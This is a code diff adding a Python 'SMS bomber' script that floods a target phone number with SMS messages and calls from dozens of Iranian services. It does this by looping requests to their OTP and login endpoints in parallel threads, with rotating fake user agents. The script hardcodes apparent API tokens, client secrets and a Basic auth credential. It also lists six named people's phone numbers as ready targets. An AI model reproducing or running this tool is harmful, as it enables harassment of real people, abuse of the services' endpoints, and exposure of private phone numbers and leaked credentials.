@@ -1,0 +1,586 @@
+from threading import Thread
+from time import sleep
+from random import randint
+from webbrowser import open as opens
+import os
+
+try:
+    from requests import get, post
+    from fake_useragent import UserAgent
+except ImportError:
+    print(
+        "You need to install some libs to use this module!\ninstalling libs... run program after installation")
+
+    os.system("pip install -r requirements.txt")
+    exit()
+
+
+try:
+    data = get("https://raw.githubusercontent.com/amirali900311/Python-Data/refs/heads/main/data.json").json()['smsbm']
+    if not data['enable']:
+        
+        opens('https://i1.sndcdn.com/artworks-000073953490-dvsfhf-t1080x1080.jpg')
+        print(data['text'])
+        sleep(100)
+        print('Fcuk u')
+        sleep(1)
+        exit()
+
+except Exception:
+    print('No internet connection')
+    print('Quitting !')
+    print('3')
+    sleep(1)
+    print('2')
+    sleep(1)
+    print('1')
+    sleep(1)
+    exit()
+
+ua = UserAgent()
+
+phonenumbers = {'rezaHsn': "09965997022",
+                'hosseinhabib': "09044509384",
+                'nimaAsgh': "09157915254",
+                'emm': "09030231850",
+                'sadrare': "09391399237",
+                'aminmm': "09367321850"}
+
+
+def makeheader():
+    headers = {'User-Agent': ua.random}
+    return headers
+
+
+def banner():
+    print("""
+  ██████  ███▄ ▄███▓  ██████     ▄▄▄▄    ▒█████   ███▄ ▄███▓ ▄▄▄▄   ▓█████  ██▀███  
+▒██    ▒ ▓██▒▀█▀ ██▒▒██    ▒    ▓█████▄ ▒██▒  ██▒▓██▒▀█▀ ██▒▓█████▄ ▓█   ▀ ▓██ ▒ ██▒
+░ ▓██▄   ▓██    ▓██░░ ▓██▄      ▒██▒ ▄██▒██░  ██▒▓██    ▓██░▒██▒ ▄██▒███   ▓██ ░▄█ ▒
+  ▒   ██▒▒██    ▒██   ▒   ██▒   ▒██░█▀  ▒██   ██░▒██    ▒██ ▒██░█▀  ▒▓█  ▄ ▒██▀▀█▄  
+▒██████▒▒▒██▒   ░██▒▒██████▒▒   ░▓█  ▀█▓░ ████▓▒░▒██▒   ░██▒░▓█  ▀█▓░▒████▒░██▓ ▒██▒
+▒ ▒▓▒ ▒ ░░ ▒░   ░  ░▒ ▒▓▒ ▒ ░   ░▒▓███▀▒░ ▒░▒░▒░ ░ ▒░   ░  ░░▒▓███▀▒░░ ▒░ ░░ ▒▓ ░▒▓░
+░ ░▒  ░ ░░  ░      ░░ ░▒  ░ ░   ▒░▒   ░   ░ ▒ ▒░ ░  ░      ░▒░▒   ░  ░ ░  ░  ░▒ ░ ▒░
+░  ░  ░  ░      ░   ░  ░  ░      ░    ░ ░ ░ ░ ▒  ░      ░    ░    ░    ░     ░░   ░ 
+      ░         ░         ░      ░          ░ ░         ░    ░         ░  ░   ░     
+                                      ░                           ░                 
+                        By amirali900311
+                    \"Use it at your own risk!\"
+        there is a limit ! you can use it just in iran!\n\n
+          Included phones [rezaHsn, hosseinhabib, nimaAsgh, emm, sadrare, aminmm]""")
+
+banner()
+
+targetphone = input('Enter target phone number: ')
+if targetphone in phonenumbers:
+    targetphone = phonenumbers[targetphone]
+if targetphone in data['banned']:
+    opens('https://i1.sndcdn.com/artworks-000073953490-dvsfhf-t1080x1080.jpg')
+    exit()
+print('Started on ', targetphone)
+
+
+def divarsms(phonenum: str):
+    while True:
+        try:
+            status_code = post(url='https://api.divar.ir/v5/auth/authenticate', json={'phone': phonenum},
+                               headers=makeheader()).status_code
+            print(f'Divar: {status_code}')
+        except Exception as e:
+            print(f'Divar Error: {e}')
+        sleep(randint(100, 130))  # 30
+
+
+def snappsms(phonenum: str):
+    while True:
+        try:
+            status_code = post(url='https://api.snapp.ir/api/v1/sms/link', json={'phone': phonenum},
+                               headers=makeheader()).status_code
+            print(f'Snapp: {status_code}')
+        except Exception as e:
+            print(f'Snapp Error: {e}')
+        sleep(randint(200, 300))
+
+
+def shaipoorsms(phonenum: str):
+    while True:
+        try:
+            status_code = post(url='https://www.sheypoor.com/api/v10.0.0/auth/send', json={'username': phonenum},
+                               headers=makeheader()).status_code
+            print(f'Shaipoor: {status_code}')
+        except Exception as e:
+            print(f'Shaipoor Error: {e}')
+        sleep(randint(150, 200))  # 90 S
+
+
+def torobsms(phonenum: str):
+    while True:
+        try:
+            status_code = get(
+                f"https://api.torob.com/v4/user/phone/send-pin/?phone_number={phonenum}&_http_referrer=https://www.google.com/&source=next_desktop",
+                headers=makeheader()).status_code
+            print(f'Torob: {status_code}')
+        except Exception as e:
+            print(f'Torob Error: {e}')
+        sleep(randint(200, 300))
+
+
+def digikalasms(phonenum: str):
+    while True:
+        try:
+            status_code = post("https://api.digikala.com/v1/user/authenticate/", json={"backUrl": "/product/dkp"
+                                                                                                  "-9744990/رم-دسکتاپ-ddr4-دو-کاناله-3600-مگاهرتز-cl18-کورسیر-مدل-vengeance-rgb-pro-ظرفیت-16-گیگابایت/",
+                                                                                       "username": f"{phonenum}",
+                                                                                       "otp_call": False,
+                                                                                       "force_send_otp": True,
+                                                                                       "hash": None},
+                               headers=makeheader()).status_code
+            print(f'DigiKala: {status_code}')
+        except Exception as e:
+            print(f'DigiKala Error: {e}')
+        sleep(randint(250, 350))  # 180
+
+
+def basalamsms(phonenum: str):
+    while True:
+        try:
+            status_code = post(url='https://auth.basalam.com/captcha/otp-request',
+                               json={"mobile": phonenum, "client_id": "11"}, headers=makeheader()).status_code
+            print(f'Basalam: {status_code}')
+        except Exception as e:
+            print(f'Basalam Error: {e}')
+        sleep(randint(100, 300))  # 60
+
+
+def lionsms(phonenum: str):
+    while True:
+        try:
+            status_code = post(url='https://www.lioncomputer.com/api/v1/auth/send-register-code',
+                               json={'mobile': phonenum,
+                                     'redirect_url': 'https://www.lioncomputer.com/listing/c-external-hard-disk'},
+                               headers=makeheader()).status_code
+            print(f'Lion: {status_code}')
+        except Exception as e:
+            print(f'Lion Error: {e}')
+        sleep(randint(200, 350))
+
+
+def alibabasms(phonenum: str):
+    while True:
+        try:
+            status_code = post("https://ws.alibaba.ir/api/v3/account/mobile/otp", json={"phoneNumber": phonenum},
+                               headers=makeheader()).status_code
+            print(f'Alibaba: {status_code}')
+        except Exception as e:
+            print(f'Alibaba Error: {e}')
+        sleep(randint(150, 300))  # ?
+
+
+def jabamasms(phonenum: str):
+    while True:
+        try:
+            status_code = post('https://gw.jabama.com/api/v4/account/send-code', json={"mobile": phonenum},
+                               headers=makeheader()).status_code
+            print(f'Jabama: {status_code}')
+        except Exception as e:
+            print(f'Jabama Error: {e}')
+        sleep(randint(200, 350))
+
+
+def acharehsms(phonenum: str):
+    if phonenum.startswith('0'):
+        phonenum = '98' + phonenum[1:]
+    while True:
+        try:
+            status_code = post('https://api.achareh.co/v2/accounts/login/?web=true', json={"phone": phonenum},
+                               headers=makeheader()).status_code
+            print(f'Achareh: {status_code}')
+        except Exception as e:
+            print(f'Achareh Error: {e}')
+        sleep(randint(200, 300))
+
+
+def barghmansms(phonenum: str):
+    while True:
+        try:
+            status_code = post("https://uiapi2.saapa.ir/api/otp/sendCode",
+                               json={"mobile": phonenum, "from_meter_buy": False}, headers=makeheader()).status_code
+            print(f'Bargh: {status_code}')
+        except Exception as e:
+            print(f'Bargh Error: {e}')
+        sleep(randint(400, 500))
+
+
+def banimodesms(phonenum: str):
+    while True:
+        try:
+            status_code = post("https://mobapi.banimode.com/api/v2/auth/request", json={"phone": phonenum},
+                               headers=makeheader()).status_code
+            print(f'Banimode: {status_code}')
+        except Exception as e:
+            print(f'Banimode Error: {e}')
+
+        sleep(randint(200, 300))
+
+
+def docnextsms(phonenum: str):
+    while True:
+        try:
+            status_code = post('https://cyclops.drnext.ir/v1/patients/auth/send-verification-token',
+                               json={"source": "besina", "mobile": phonenum,
+                                     "key": "U2FsdGVkX1+Yu+MKRsdf9bxtrvdhB287ZhA0FR5VWCRjOzhmbwAKyXsSXy7JGZG6dUn8xnrV8GOEU4P5fGzk9w=="},
+                               headers=makeheader()).status_code
+            print(f'Docnexts: {status_code}')
+        except Exception as e:
+            print(f'Docnexts Error: {e}')
+
+        sleep(randint(200, 300))
+
+
+def tapsifoodsms(phonenum: str):
+    while True:
+        try:
+            status_code = post('https://api.tapsi.food/v1/api/Authentication/otp', json={"cellPhone": phonenum},
+                               headers=makeheader(),
+                               verify=False).status_code
+            print(f'Tapsi: {status_code}')
+        except Exception as e:
+            print(f'Tapsi Error: {e}')
+        sleep(randint(200, 300))
+
+
+def aritonsms(phonenum: str):
+    while True:
+        try:
+            status_code = post('https://api.erythron.net/v1/user/getVerifyCode',
+                               json={"auth_type": "mobile", "auth_value": phonenum}, headers=makeheader()).status_code
+            print(f'Ariton: {status_code}')
+        except Exception as e:
+            print(f'Ariton Error: {e}')
+
+        sleep(randint(100, 200))
+
+
+def takhfifansms(phonenum: str): #403 Error
+    while True:
+        try:
+            status_code = post('https://takhfifan.com/v6/api/magento/login/init', json={"username": phonenum},
+                               headers=makeheader()).status_code
+            print(f'Takhfifan: {status_code}')
+        except Exception as e:
+            print(f'Takhfifan Error: {e}')
+
+        sleep(randint(200, 300))
+
+
+def khayevarbimehsms(phonenum: str):
+    while True:
+        try:
+            status_code = post('https://melico.ir/auth/check-user',
+                               json={"username": phonenum, "group": "my", "recaptcha_token": "abcd"},
+                               headers=makeheader()).status_code
+            print(f'Khayevarbimeh: {status_code}')
+        except Exception as e:
+            print(f'Khayevarbime Error: {e}')
+        sleep(randint(150, 300))  # 90 S
+
+
+def karabizsms(phonenum: str): # 500 Error
+    while True:
+        try:
+            status_code = post('https://panel.karabiz.ir/api/api/user/signup',
+                               json={"Mobile": phonenum, "SchoolId": -1, "url": "panel.karabiz.ir",
+                                     "identifierCode": ""}).status_code
+            print(f'Karabiz: {status_code}')
+        except Exception as e:
+            print(f'Karabiz Error: {e}')
+
+        sleep(randint(200, 300))  # 120
+
+
+def azkivamsms(phonenum: str):
+    while True:
+        try:
+            status_code = post('https://api.azkivam.com/auth/login',
+                               json={"mobileNumber": phonenum, "medium": "cpc", "source": "google",
+                                     "campaign": "credit-blu-general"}, headers=makeheader()).status_code
+            print(f'AzkivamSms: {status_code}')
+        except Exception as e:
+            print(f'Azkivam Error: {e}')
+
+        sleep(randint(250, 300))
+
+
+def azkivamcall(phonenum: str):
+    while True:
+        try:
+            status_code = post('https://api.azkivam.com/auth/login',
+                               json={"mobileNumber": phonenum, "messageType": "CALL"},
+                               headers=makeheader()).status_code
+            print(f'AzkivamCall!: {status_code}')
+        except Exception as e:
+            print(f'AzkivamCall Error: {e}')
+
+        sleep(randint(300, 500))  # 120
+
+
+def vitrinshopcall(phonenum: str):
+    while True:
+        try:
+            status_code = post('https://www.vitrin.shop/api/v1/user/request_code',
+                               json={"phone_number": phonenum, "forgot_password": False}, ).status_code
+            print(f'VitrinshopCall: {status_code}')
+        except Exception as e:
+            print(f'VitrinshopCall Error: {e}')
+        sleep(randint(400, 500))
+
+
+def wallgoldsms(phonenum: str):
+    while True:
+        try:
+            status_code = post('https://api.wallgold.ir/api/v1/auth/login-signup',
+                               json={"mobileNumber": phonenum, "deviceName": "web", "platform": "web",
+                                     "type": "NoCaptcha"}, headers=makeheader()).status_code
+            print(f'Wallgold: {status_code}')
+        except Exception as e:
+            print(f'Wallgold Error: {e}')
+        sleep(randint(100, 200))
+
+
+def baladsms(phonenum: str):
+    while True:
+        try:
+            status_code = post('https://account.api.balad.ir/api/web/auth/login/',
+                               json={"phone_number": phonenum, "os_type": "W"}, headers=makeheader()).status_code
+            print(f'Balad: {status_code}')
+        except Exception as e:
+            print(f'Balad Error: {e}')
+        sleep(randint(200, 300))
+
+
+def ofoghkoroshsms(phonenum: str):
+    while True:
+        try:
+            status_code = post('https://my.okcs.com/api/check-mobile', headers=makeheader(), json={
+                "mobile": phonenum,
+                "g-recaptcha-response": "03AGdBq255m4Cy9SQ1L5cgT6yD52wZzKacalaZZw41D"
+                                        "-jlJzSKsEZEuJdb4ujcJKMjPveDKpAcMk4kB0OULT5b3v7oO_Zp8Rb9olC5lZH0Q0BVaxWWJEPfV8Rf70L58JTSyfMTcocYrkdIA7sAIo7TVTRrH5QFWwUiwoipMc_AtfN-IcEHcWRJ2Yl4rT4hnf6ZI8QRBG8K3JKC5oOPXfDF-vv4Ah6KsNPXF3eMOQp3vM0SfMNrBgRbtdjQYCGpKbNU7P7uC7nxpmm0wFivabZwwqC1VcpH-IYz_vIPcioK2vqzHPTs7t1HmW_bkGpkZANsKeDKnKJd8dpVCUB1-UZfKJVxc48GYeGPrhkHGJWEwsUW0FbKJBjLO0BdMJXHhDJHg3NGgVHlnOuQV_wRNMbUB9V5_s6GM_zNDFBPgD5ErCXkrE40WrMsl1R6oWslOIxcSWzXruchmKfe"}).status_code
+            print(f'Ofoghkorosh: {status_code}')
+
+        except Exception as e:
+            print(f'Ofoghkorosh Error: {e}')
+        sleep(randint(100, 200))
+
+
+def filmnetsms(phonenum: str):
+    while True:
+        try:
+            status_code = get(f"https://filmnet.ir/api-v2/access-token/users/{phonenum}%20/otp",
+                              headers=makeheader()).status_code
+            print(f'Filmnet: {status_code}')
+        except Exception as e:
+            print(f'Filmnet Error: {e}')
+        sleep(randint(200, 280))
+
+
+def azkisms(phonenum: str):
+    while True:
+        try:
+            headers = {'accept': 'application/json, text/plain, */*',
+                       'accept-encoding': 'gzip, deflate, br',
+                       'accept-language': 'en-US,en;q=0.9',
+                       'authorization': 'Basic QmltaXRvQ2xpZW50OkJpbWl0b1NlY3JldA==',
+                       'device': 'web',
+                       'deviceid': '6',
+                       'password': 'BimitoSecret',
+                       'origin': 'https://www.azki.com',
+                       'referer': 'https://www.azki.com/',
+                       'user-agent': ua.random,
+                       'user-token': 'LW6H4KSMStwwKXWeFey05gtdw2iW8QRtSk70phP6tBJindQ4irdzTmSqDI9TkVqE',
+                       'username': 'BimitoClient'}
+            status_code = post("https://www.azki.com/api/vehicleorder/v2/app/auth/check-login-availability/",
+                               json={"phoneNumber": phonenum, "origin": "www.azki.com"}, headers=headers).status_code
+            print(f"Azki: {status_code}")
+        except Exception as e:
+            print(f'Azki: {e}')
+        sleep(randint(100, 200))
+
+
+def pindosms(phonenum: str):
+    while True:
+        try:
+            status_code = post("https://api.pindo.ir/v1/user/login-register/", json={'phone': phonenum},
+                               headers=makeheader()).status_code
+            print(f'Pindo: {status_code}')
+        except Exception as e:
+            print(f'Pindo: {e}')
+        sleep(randint(180, 200))
+
+
+def dgshahrsms(phonenum: str):
+    while True:
+        try:
+            status_code = post('https://lend-b.dgshahr.com/user/login/',
+                               json={"phone_number": phonenum, "source": " google-cpc"},
+                               headers=makeheader()).status_code
+            print(f'Dgshahr: {status_code}')
+        except Exception as e:
+            print(f'Dgshahr: {e}')
+        sleep(randint(260, 300))
+
+
+def superforidigikalasms(phonenum: str):
+    while True:
+        try:
+            status_code = post('https://api.digikalajet.ir/user/login-register/', json={"phone": phonenum},
+                               headers=makeheader()).status_code
+            print(f'Superforidigikalasms: {status_code}')
+        except Exception as e:
+            print(f'Superforidigikalasms: {e}')
+        sleep(randint(180, 200))
+
+
+def snappmarketsms(phonenum: str):
+    while True:
+        try:
+            status_code = post(f"https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone={phonenum}",
+                               headers=makeheader()).status_code
+            print(f'SnappMarket: {status_code}')
+        except Exception as e:
+            print(f'SnappMarket: {e}')
+        sleep(randint(100, 140))
+
+
+def sabzimansms(phonenum: str):
+    while True:
+        try:
+            data = {
+                "action": "newphoneexist",
+                "phonenumber": phonenum
+            }
+
+            headers = {
+                "User-Agent": ua.random,
+                "Accept": "*/*",
+                "Accept-Language": "en-US,en;q=0.5",
+                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+                "X-Requested-With": "XMLHttpRequest",
+                "Origin": "https://sabziman.com",
+                "Referer": "https://sabziman.com/",
+            }
+            status_code = post("https://sabziman.com/wp-admin/admin-ajax.php", data=data, headers=headers).status_code
+            print(f'Sabziman: {status_code}')
+        except Exception as e:
+            print(f'Sabziman: {e}')
+        sleep(randint(130, 160))
+
+
+def iranicartsms(phonenum: str):
+    while True:
+        try:
+            status_code = post("https://sabziman.com/wp-admin/admin-ajax.php", json={"mobile": phonenum,
+                                                                                     "key": "eyJpdiI6IjFVcnpkVkh2NXVPa1BhWHZlRytqaXc9PSIsInZhbHVlIjoiMmZ0L1lNZ0JRNUFXZDVBU2NtOEsrTmY0M2VqQ1RDa2F6K3RQblJWQ2hhZ0hNaE02WkxraGhZbFpBbzdyRWFEYjdoR0tLRjlOb2poZ0d2WWlsQ1hzNHhsdmJkbWp4TXMyMEpOSlNqU1dXK1k9IiwibWFjIjoiYWE2N2IxMzg3OWM5NjMyYTQxZjc2MzYyNzMyN2ZlMjZlM2E3ZDU3NzgwZWVjMTIxYjc0MDE1ZTY1YzY2MWRlMyIsInRhZyI6IiJ9"},
+                               headers=makeheader()).status_code
+            print(f'Iranicart: {status_code}')
+        except Exception as e:
+            print(f'Iranicart: {e}')
+        sleep(randint(100, 140))  # ?
+
+
+def digipaysms(phonenum: str):
+    while True:
+        try:
+            status_code = post("https://api.mydigipay.com/digipay/api/users/send-sms", json={"cellNumber": phonenum,
+                                                                                             "device": {
+                                                                                                 "deviceId": "8c862cbc-d305-4f76-a134-b3e937dd76d4",
+                                                                                                 "deviceModel": "Windows/Firefox",
+                                                                                                 "deviceAPI": "WEB_BROWSER",
+                                                                                                 "osName": "WEB"}},
+                               headers={'user-agent': ua.firefox}).status_code
+            print(f'Digipay: {status_code}')
+        except Exception as e:
+            print(f'Digipay: {e}')
+        sleep(randint(160, 200))
+
+
+def shandiziransms(phonenum: str):
+    while True:
+        try:
+            status_code = post("https://shandiz.iran.liara.run/api/V1/customer/login/code/send",
+                               json={"mobile_number": phonenum}, headers=makeheader()).status_code
+            print(f'Shandizi: {status_code}')
+        except Exception as e:
+            print(f'Shandizi: {e}')
+        sleep(randint(120, 150))
+
+def pizzawindow(phonenum: str):
+    while True:
+        try:
+            status_code = post("https://restaurant.delino.com/user/register",
+                               json={"apiToken": "lv3sgZvKKUgc3GpayVVBq8Sw3tguTk9IYbGIXhLGjnhDQtyTNwD2gzwncF1x4B1j",
+                                     "clientSecret": "Vvo4qB2gRUNwev5A2w5osgS19HhAmAUM", "device": "web",
+                                     "username": phonenum}, headers=makeheader()).status_code
+            print(f"Pizzawindow: {status_code}")
+        except Exception as e:
+            print("Pizzawindow Error: ", e)
+        sleep(randint(100, 140))
+
+
+def pizzawindowcall(phonenum: str):
+    while True:
+        try:
+            status = post("https://restaurant.delino.com/user/call",
+                          json={"apiToken": "lv3sgZvKKUgc3GpayVVBq8Sw3tguTk9IYbGIXhLGjnhDQtyTNwD2gzwncF1x4B1j",
+                                "clientSecret": "Vvo4qB2gRUNwev5A2w5osgS19HhAmAUM", "device": "web", "username": phonenum},
+                          headers=makeheader()).status_code
+            print("Pizzawindow call: ", status)
+        except Exception as e:
+            print("Pizzawindow call Error: ", e)
+        sleep(randint(150, 180))
+
+
+def zodkossms(phonenum: str):
+    while True:
+        try:
+            status = post("https://admin.zoodex.ir/api/v2/login/check?need_sms=1", json={"mobile":phonenum}, headers=makeheader()).status_code
+            print(f"Zodkossms: {status}")
+        except Exception as e:
+            print("Zodkossms Error: ", e)
+        sleep(randint(120, 140))
+
+
+def foodlandsms(phonenum: str):
+    while True:
+        try:
+            status = post("https://restaurant.delino.com/user/register", json={"apiToken":"KbCO8YaHKctowfL1Rny8gB9A9B2kGZvHJBbN918Nsn1p2Ui0FbLWdJ1JdCQ6hzAu","clientSecret":"MvfPc5BT2lRrpmOCYZzAAGg7d7J8ZVnv","device":"web","username":phonenum}).status_code
+            print(f"Foodland: {status}")
+        except Exception as e:
+            print("Foodland Error: ", e)
+        sleep(randint(180, 220))
+
+
+def foodlandcall(phonenum: str):
+    while True:
+        try:
+            status = post("https://restaurant.delino.com/user/call",
+                          json={"apiToken":"KbCO8YaHKctowfL1Rny8gB9A9B2kGZvHJBbN918Nsn1p2Ui0FbLWdJ1JdCQ6hzAu","clientSecret":"MvfPc5BT2lRrpmOCYZzAAGg7d7J8ZVnv","device":"web","username":phonenum},
+                          headers=makeheader()).status_code
+            print("Foodland call: ", status)
+        except Exception as e:
+            print("Foodland Error: ", e)
+        sleep(randint(140, 180))
+
+# azkivamsms --> Blocked
+funcs = [divarsms, snappsms, shaipoorsms, torobsms, digikalasms, basalamsms, alibabasms, jabamasms, acharehsms,
+         barghmansms, lionsms, banimodesms, docnextsms, tapsifoodsms, aritonsms, takhfifansms, khayevarbimehsms,
+         karabizsms, azkivamcall, vitrinshopcall, baladsms, ofoghkoroshsms, filmnetsms,
+         azkisms, pindosms, dgshahrsms, superforidigikalasms, snappmarketsms, sabzimansms, digipaysms,
+         shandiziransms, pizzawindow, zodkossms, foodlandsms, pizzawindowcall, foodlandcall]
+threads = []
+for func in funcs:
+    thread = Thread(target=func, daemon=True, args=(targetphone,))
+    thread.start()
+    threads.append(thread)
+
+for thread in threads:
+    thread.join()
